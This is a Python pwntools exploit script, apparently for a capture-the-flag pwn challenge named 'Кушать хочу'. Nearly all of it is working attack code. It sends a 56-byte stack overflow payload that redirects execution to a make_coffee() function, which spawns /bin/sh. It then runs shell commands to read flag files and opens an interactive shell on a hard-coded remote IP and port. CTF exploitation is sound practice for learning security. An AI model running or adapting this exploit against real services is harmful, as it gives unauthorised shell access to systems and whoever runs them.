#!/usr/bin/env python3
# Exploit for "Кушать хочу" (pwn) — ret2win to make_coffee -> execl("/bin/sh","sh",NULL).
# Works locally and against the remote service.
#
# Usage:
#   pip install pwntools
#   python3 exploit_want_to_eat.py remote     # attack 62.173.139.193:18002
#   python3 exploit_want_to_eat.py local      # test against ./want_to_eat (optional)
#
from pwn import *
import sys

HOST = "62.173.139.193"
PORT = 18002

BIN_PATH = "./want_to_eat"         # put the provided ELF next to this script for local test (optional)
RET2WIN = 0x401216                 # address of make_coffee()
OFFSET  = 56                       # overflow distance to saved RIP in book_table()

context.arch   = "amd64"
context.log_level = "info"

def build_payload():
    return b"A"*OFFSET + p64(RET2WIN)

def pwn(io: tube):
    # menu: '>>>'
    io.sendlineafter(b">>>", b"1")              # 1. Забронировать столик
    # name (fgets into 0x30 buffer with size 0x100) -> overflow
    io.sendline(build_payload())
    # seats (scanf("%d")) — feed any number
    io.sendline(b"1")
    # when function returns, RIP jumps to make_coffee -> execl("/bin/sh","sh",NULL)
    # we should now have a shell; grab the flag
    io.sendline(b"cat /flag* 2>/dev/null || cat flag* 2>/dev/null || ls; echo __END__")
    data = io.recvuntil(b"__END__", drop=True, timeout=5)
    print(data.decode("utf-8", errors="ignore"))
    # Drop to interactive in case you want to poke around
    io.interactive()

def main():
    mode = (sys.argv[1].lower() if len(sys.argv) > 1 else "remote")
    if mode == "local":
        elf = context.binary = ELF(BIN_PATH, checksec=False)
        io = process(elf.path)
    else:
        io = remote(HOST, PORT)
    try:
        pwn(io)
    finally:
        io.close()

if __name__ == "__main__":
    main()
